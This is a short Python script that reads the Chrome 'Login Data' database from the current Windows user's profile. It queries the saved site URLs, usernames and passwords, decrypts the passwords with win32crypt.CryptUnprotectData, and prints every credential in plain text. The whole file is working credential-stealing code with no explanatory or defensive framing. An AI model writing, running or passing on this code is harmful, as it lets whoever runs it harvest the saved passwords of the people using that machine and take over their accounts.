import os, sqlite3, win32crypt

# Automatically get the logged in user's default folder
data = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

# Connect to Login Data database
connection = sqlite3.connect(data)
cursor = connection.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
final_data = cursor.fetchall()

# Close the database connection
cursor.close()

print(final_data[1])

# Iterating through all the values found...
for chrome_logins in final_data:
        password = win32crypt.CryptUnprotectData(chrome_logins[2], None, None, None, 0)[1]
        print("Website : "+str(chrome_logins[0]))
        print("Username : "+str(chrome_logins[1]))
        print("Password : "+str(password))

